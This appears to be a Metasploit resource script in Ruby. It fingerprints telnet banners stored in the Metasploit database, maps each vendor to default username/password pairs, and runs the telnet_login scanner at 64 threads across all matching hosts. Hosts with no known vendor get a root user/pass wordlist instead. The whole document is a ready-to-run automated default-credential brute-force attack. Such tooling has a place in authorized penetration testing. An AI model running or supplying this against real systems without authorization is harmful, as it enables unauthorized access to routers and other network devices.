<ruby>

hosts = {}
host_id_to_ip = {}			# mapping of host id to host ip

filter = '.+'				# if you want to restrict the targets to a particular IP network, set this (its a REGEXP)

# list of telnet banners to a vendor
@fingerprints = CSV.read(File.join(Msf::Config.install_root, 'data', 'wordlists', 'telnet_default_fingerprints.csv'))

# preferred default usernames for a given vendor
@the_list = CSV.read(File.join(Msf::Config.install_root, 'data', 'wordlists', 'telnet_users.csv'))


def checkVendor(banner)
# strip out \n and \r, check the finger prints and return the vendors if known
list = []
	banner.gsub!('\x0a', '')
	banner.gsub!('\x0d', '')
	@fingerprints.each do |fp|
		if ( banner =~ /#{fp[0]}/ )
			list.push(fp[1])
		end
	end
	return list if list.count > 0
	return nil

end

def vendorToUsers(vendor)
# take a given vendor and return a list of preferred default usernames/passwords
	@the_list.each do |line|
		if(line[0] == vendor)
			list = line[1].split(/\\x01/)
			return list
		end
	end
	return nil
end

begin
# get a mapping of host_ids to IP addresses for populating targets
	framework.db.hosts.each do |host|
		if(host.address =~ /#{filter}/)
			host_id_to_ip[host.id] = host.address
		end
	end
	rescue ActiveRecord::ConnectionNotEstablished
		puts "DB not connected...Database connection must be established prior to running this script"
# uncomment if you want to auto connect
#		self.run_single('db_connect <credentials>')
#		puts "trying again..."
#		retry
end



framework.db.services.each do |service|
# for each service, if it is telnet and open, add it to list of targets
	if ( service.port == 23 and service.proto == 'tcp' )
		ip = host_id_to_ip[service.host_id]
		info = service.info
		if(info != '')
			hosts["#{ip}"] = info
		end
	end
end

# setup the telnet_login module
self.run_single("use auxiliary/scanner/telnet/telnet_login")
self.run_single("set VERBOSE false")
self.run_single("set USER_AS_PASS false")
self.run_single("set BLANK_PASSWORDS false")
self.run_single("set THREADS 64")

vendor_ip_lists = {}

hosts.each do |rhost|
# for each host, check the vendor, combine like vendor into an IP target list (to take advantage of scanner threading)
		vendor_list = checkVendor(rhost[1])
		if(vendor_list != nil)
			vendor_list.each do |x|
				if (vendor_ip_lists[x] == nil)
					vendor_ip_lists[x] = "#{rhost[0]} "
				else
					vendor_ip_lists[x] << "#{rhost[0]} "
				end
			end
		else

			if(vendor_ip_lists['none'] == nil)
				vendor_ip_lists['none'] = "#{rhost[0]} "
			else
				vendor_ip_lists['none'] << "#{rhost[0]} "
			end
		end
end

vendor_ip_lists.each do |vendor, list|
# for each vendor, set RHOSTS, then try each username/password combo
	puts "**** Doing Vendor #{vendor} ****"
	users = vendorToUsers(vendor)
	self.run_single("set RHOSTS #{list}")
	if(users == nil)
		# Don't have any users to try
		# try blank first
		self.run_single('unset PASSWORD')
		self.run_single('unset USERNAME')
		self.run_single('exploit')

		if(vendor == "none")
			# use default list
			self.run_single("unset PASSWORD")
			self.run_single("unset USERNAME")
			self.run_single("set USERPASS_FILE " << File.join(Msf::Config.install_root, 'data', 'wordlists', 'root_userpass.txt'))
			self.run_single('exploit')
		end			
	else
		users.each do |c|
			u,p = c.split(/\\x00/)
			if("#{p}" != '')
				self.run_single("set PASSWORD #{p}")
			else
				self.run_single("unset PASSWORD")
			end
			if("#{u}" != '')
				self.run_single("set USERNAME #{u}")
			else
				self.run_single("unset USERNAME")
			end
			self.run_single("exploit")
		end 
	end
end

</ruby>

